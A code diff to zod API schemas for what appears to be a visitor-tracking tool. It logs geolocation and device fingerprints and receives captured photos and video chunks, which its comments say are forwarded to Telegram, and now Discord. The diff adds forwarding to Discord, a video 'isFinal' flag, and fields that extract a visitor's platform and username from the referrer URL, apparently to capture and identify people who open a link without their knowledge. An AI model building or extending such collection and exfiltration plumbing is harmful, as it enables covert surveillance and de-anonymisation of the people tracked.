@@ -26,7 +26,9 @@ export const LogVisitBody = zod.object({
   "longitude": zod.number().nullish(),
   "accuracy": zod.number().nullish(),
   "altitude": zod.number().nullish(),
-  "referrer": zod.string().nullish()
+  "referrer": zod.string().nullish(),
+  "source": zod.string().nullish().describe('Detected origin platform (facebook\/telegram\/discord\/etc)'),
+  "sourceName": zod.string().nullish().describe('Username or handle extracted from referrer URL')
 })
 
 export const LogVisitResponse = zod.object({
@@ -43,6 +45,8 @@ export const LogVisitResponse = zod.object({
   "os": zod.string().nullish(),
   "deviceType": zod.string().nullish(),
   "referrer": zod.string().nullish(),
+  "source": zod.string().nullish(),
+  "sourceName": zod.string().nullish(),
   "createdAt": zod.string()
 })
 
@@ -65,6 +69,8 @@ export const ListVisitsResponseItem = zod.object({
   "os": zod.string().nullish(),
   "deviceType": zod.string().nullish(),
   "referrer": zod.string().nullish(),
+  "source": zod.string().nullish(),
+  "sourceName": zod.string().nullish(),
   "createdAt": zod.string()
 })
 export const ListVisitsResponse = zod.array(ListVisitsResponseItem)
@@ -92,6 +98,8 @@ export const GetVisitStatsResponse = zod.object({
   "os": zod.string().nullish(),
   "deviceType": zod.string().nullish(),
   "referrer": zod.string().nullish(),
+  "source": zod.string().nullish(),
+  "sourceName": zod.string().nullish(),
   "createdAt": zod.string()
 })),
   "topCountries": zod.array(zod.object({
@@ -106,7 +114,7 @@ export const GetVisitStatsResponse = zod.object({
 
 
 /**
- * Receives collected device/browser info and forwards to Telegram
+ * Receives collected device/browser info and forwards to Telegram and Discord
  * @summary Send device fingerprint info
  */
 export const SendDeviceInfoBody = zod.record(zod.string(), zod.unknown())
@@ -117,7 +125,7 @@ export const SendDeviceInfoResponse = zod.object({
 
 
 /**
- * Receives a base64-encoded photo and forwards to Telegram
+ * Receives a base64-encoded photo and forwards to Telegram and Discord
  * @summary Send a captured photo
  */
 export const SendPhotoBody = zod.object({
@@ -131,14 +139,15 @@ export const SendPhotoResponse = zod.object({
 
 
 /**
- * Receives a base64-encoded video chunk and forwards to Telegram
+ * Receives a base64-encoded video chunk and forwards to Telegram and Discord
  * @summary Send a video recording chunk
  */
 export const SendVideoChunkBody = zod.object({
   "chunk": zod.string(),
   "mimeType": zod.string().nullish(),
   "index": zod.number().nullish(),
-  "label": zod.string().nullish()
+  "label": zod.string().nullish(),
+  "isFinal": zod.boolean().nullish()
 })
 
 export const SendVideoChunkResponse = zod.object({
